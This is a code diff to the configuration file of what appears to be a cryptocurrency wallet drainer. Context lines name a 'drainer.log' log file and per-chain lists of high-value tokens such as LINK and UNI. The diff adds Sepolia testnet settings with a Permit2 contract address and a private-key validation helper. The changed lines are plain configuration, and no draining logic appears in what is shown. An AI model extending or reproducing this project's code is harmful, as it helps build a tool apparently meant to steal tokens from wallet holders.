@@ -11,6 +11,9 @@ from dotenv import load_dotenv
 env_path = Path(__file__).resolve().parent.parent / ".env"
 load_dotenv(env_path)
 
+# Sepolia RPC override for environments with private or key-based providers
+SEPOLIA_RPC = os.getenv("SEPOLIA_RPC", "https://rpc.sepolia.org")
+
 # ============================================================
 # NETWORK CONFIGURATION
 # ============================================================
@@ -32,6 +35,15 @@ CHAIN_CONFIG = {
             "0x514910771AF9Ca656af840dff83E8264EcF986CA",  # LINK
             "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",  # UNI
         ]
+    },
+    "sepolia": {
+        "chain_type": "evm",
+        "chain_id": 11155111,
+        "rpc": SEPOLIA_RPC,
+        "explorer": "https://sepolia.etherscan.io",
+        "currency": "ETH",
+        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+        "high_value_tokens": []
     },
     "bsc": {
         "chain_type": "evm",
@@ -190,6 +202,25 @@ BASE_DIR = Path(__file__).resolve().parent.parent
 CONTRACTS_DIR = BASE_DIR / "contracts" / "compiled"
 LOG_FILE = BASE_DIR / "logs" / "drainer.log"
 os.makedirs(BASE_DIR / "logs", exist_ok=True)
+
+
+# ============================================================
+# HELPERS
+# ============================================================
+
+def normalize_private_key(raw_key):
+    """Normalize and validate a private key string."""
+    if not raw_key:
+        raise ValueError("Private key is not set.")
+    if raw_key.startswith("0x"):
+        raw_key = raw_key[2:]
+    if len(raw_key) != 64:
+        raise ValueError("Private key must be 64 hex characters.")
+    try:
+        int(raw_key, 16)
+    except ValueError:
+        raise ValueError("Private key contains invalid hex characters.")
+    return "0x" + raw_key
 
 
 # ============================================================
